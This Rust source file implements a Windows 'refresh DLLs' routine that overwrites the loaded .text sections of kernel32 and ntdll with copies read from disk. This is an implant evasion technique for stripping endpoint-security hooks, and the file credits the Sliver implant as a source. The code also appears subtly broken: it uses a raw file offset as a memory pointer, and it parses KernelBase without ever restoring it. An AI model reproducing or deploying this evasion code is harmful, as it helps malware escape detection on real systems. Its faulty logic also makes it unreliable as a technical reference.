use goblin::pe::PE;
use std::{
    ffi::c_void,
    fs,
    io::{Error, ErrorKind},
    process,
};
use windows::{
    core::HSTRING,
    Win32::{
        Foundation::HANDLE,
        System::{
            Diagnostics::Debug::WriteProcessMemory,
            LibraryLoader::{LOAD_LIBRARY_FLAGS, LoadLibraryExW},
            Memory::{PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, VirtualProtectEx},
            Threading::{OpenProcess, PROCESS_ALL_ACCESS},
        },
    },
};

// References:
//  https://github.com/postrequest/link/blob/main/src/links/windows/src/evasion.rs
//  https://github.com/BishopFox/sliver/blob/master/implant/sliver/evasion/evasion_windows.go
pub fn refresh_dlls() -> Result<(), Error> {
    // Load contents of DLLs
    let kernel32_bytes = match fs::read("C:\\Windows\\System32\\kernel32.dll") {
        Ok(b) => b,
        Err(e) => {
            return Err(Error::new(ErrorKind::Other, e.to_string()));
        }
    };
    let kernelbase_bytes = match fs::read("C:\\Windows\\System32\\KernelBase.dll") {
        Ok(b) => b,
        Err(e) => {
            return Err(Error::new(ErrorKind::Other, e.to_string()));
        }
    };
    let ntdll_bytes = match fs::read("C:\\Windows\\System32\\ntdll.dll") {
        Ok(b) => b,
        Err(e) => {
            return Err(Error::new(ErrorKind::Other, e.to_string()));
        }
    };

    // Parse DLLs
    let kernel32 = PE::parse(&kernel32_bytes).unwrap();
    let kernelbase = PE::parse(&kernelbase_bytes).unwrap();
    let ntdll = PE::parse(&ntdll_bytes).unwrap();

    // Find the `.text` section
    let mut kernel32_text_ptr: *mut c_void = 0 as _;
    let mut kernel32_text_size: usize = 0;
    let mut kernelbase_text_ptr: *mut c_void = 0 as _;
    let mut kernelbase_text_size: usize = 0;
    let mut ntdll_text_ptr: *mut c_void = 0 as _;
    let mut ntdll_text_size: usize = 0;
    
    for i in 0..kernel32.sections.len() {
        if kernel32.sections[i].name().unwrap() == ".text" {
            kernel32_text_ptr = kernel32.sections[i].pointer_to_raw_data as *mut c_void;
            kernel32_text_size = kernel32.sections[i].size_of_raw_data as usize;
            break;
        }
    }

    for i in 0..kernelbase.sections.len() {
        if kernelbase.sections[i].name().unwrap() == ".text" {
            kernelbase_text_ptr = kernelbase.sections[i].pointer_to_raw_data as *mut c_void;
            kernelbase_text_size = kernelbase.sections[i].size_of_raw_data as usize;
            break;
        }
    }

    for i in 0..ntdll.sections.len() {
        if ntdll.sections[i].name().unwrap() == ".text" {
            ntdll_text_ptr = ntdll.sections[i].pointer_to_raw_data as *mut c_void;
            ntdll_text_size = ntdll.sections[i].size_of_raw_data as usize;
            break;
        }
    }

    // Get all handles
    let hkernel32 = unsafe {
        LoadLibraryExW(
            &HSTRING::from("kernel32.dll"),
            HANDLE::default(),
            LOAD_LIBRARY_FLAGS(0),
        ).unwrap()
    };
    let hntdll = unsafe {
        LoadLibraryExW(
            &HSTRING::from("ntdll.dll"),
            HANDLE::default(),
            LOAD_LIBRARY_FLAGS(0),
        ).unwrap()
    };

    // Get the `.text` addresses
    let hkernel32_text = unsafe { (hkernel32.0 as *mut c_void).offset(0x1000) };
    let hntdll_text = unsafe { (hntdll.0 as *mut c_void).offset(0x1000) };

    let pid = process::id();
    let handle = unsafe {
        OpenProcess(
            PROCESS_ALL_ACCESS,
            true,
            pid,
        ).unwrap()
    };

    let mut old_protect = PAGE_PROTECTION_FLAGS(0);

    // Write good bytes for the Kernel32 DLL
    let _ = unsafe {
        VirtualProtectEx(
            handle,
            hkernel32_text,
            kernel32_text_size,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
    };
    let mut ret_len: usize = 0;
    let _ = unsafe {
        WriteProcessMemory(
            handle,
            hkernel32_text,
            kernel32_text_ptr,
            kernel32_text_size,
            Some(&mut ret_len),
        )
    };
    let _ = unsafe {
        VirtualProtectEx(
            handle,
            hkernel32_text,
            kernel32_text_size,
            old_protect,
            &mut old_protect,
        )
    };

    // Write good bytes for the ntdll DLL
    let _ = unsafe {
        VirtualProtectEx(
            handle,
            hntdll_text,
            ntdll_text_size,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
    };
    let _ = unsafe {
        WriteProcessMemory(
            handle,
            hntdll_text,
            ntdll_text_ptr,
            ntdll_text_size,
            Some(&mut ret_len),
        )
    };
    let _ = unsafe {
        VirtualProtectEx(
            handle,
            hntdll_text,
            ntdll_text_size,
            old_protect,
            &mut old_protect,
        )
    };

    Ok(())
}